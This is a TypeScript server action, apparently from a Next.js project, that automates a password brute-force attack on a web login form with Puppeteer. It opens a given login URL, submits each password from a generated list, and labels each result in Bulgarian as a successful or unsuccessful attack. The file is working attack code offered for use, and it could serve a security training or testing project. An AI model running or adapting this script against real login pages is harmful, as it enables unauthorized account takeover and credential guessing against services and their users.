"use server";

import puppeteer from "puppeteer";
import { BruteForceSchema } from "./models/brute-force-schema.model";
import { generatePasswords } from "./utils/generate-passwords.util";
import { openPage } from "@/lib/utils/open-page.util";
import { fillLogin } from "@/lib/utils/fill-login.util";
import { loginSchema } from "@/lib/models/login-schema.model";

export async function submitBruteForceForm(data: BruteForceSchema) {
  const { page, browser } = await openPage();

  // Navigate the page to a URL
  await page.goto(data.loginUrl, { waitUntil: "networkidle0" });
  await page.waitForSelector(data.loginFieldSelector);

  const passwords = generatePasswords();

  const responses = [];

  for (const password of passwords) {
    await page.waitForNetworkIdle();

    if (page.url() !== data.loginUrl) {
      break;
    }

    await fillLogin(page, data, password);

    // const response = await page.waitForResponse((response) => {
    //   const request = response.request();
    //   const postData = request.postData();

    //   if (postData) {
    //     return (
    //       postData.includes(encodeURIComponent(data.loginName)) &&
    //       postData.includes(encodeURIComponent(password))
    //     );
    //   }

    //   return (
    //     request.url().includes(encodeURIComponent(data.loginName)) &&
    //     request.url().includes(encodeURIComponent(password))
    //   );
    // });

    await page.waitForNetworkIdle();

    const resultElement = await page.$(`::-p-text(${data.resultsString})`);

    responses.push({
      login: data.loginName,
      password,
      // statusCode: response.status(),
      status: resultElement ? "Успешна атака" : "Неуспешна атака",
    });
  }

  await browser.close();

  return { responses };
}
